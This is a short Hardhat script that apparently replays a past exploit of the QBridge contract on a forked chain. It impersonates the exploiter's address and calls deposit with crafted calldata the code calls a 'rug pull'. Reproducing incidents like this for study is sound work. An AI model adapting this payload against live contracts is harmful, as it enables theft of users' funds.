const hardhat = require("hardhat")
async function main() {
  hardhat.network.config.forking.blockNumber = 14090194;

  //impersonate attacker's tokenAddress
  const exploiter = "0xd01ae1a708614948b2b5e0b7ab5be6afa01325c7";
  await hardhat.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [exploiter],
  });
  const attacker = await ethers.getSigner(exploiter);
  console.log("Attacker address:", attacker.address);

  const QBridge = await hardhat.ethers.getContractAt("QBridge", "0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6");
  console.log("QBridge has been created at:", QBridge.address);

  //perform rug pull, which is the deposit function
  const DepositTx = await QBridge.connect(attacker).deposit("1", "0x00000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f01", "0x000000000000000000000000000000000000000000000000000000000000006900000000000000000000000000000000000000000000003627e8f712373c0000000000000000000000000000d01ae1a708614948b2b5e0b7ab5be6afa01325c7");
  const receipt = await DepositTx.wait();
  console.log(receipt);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
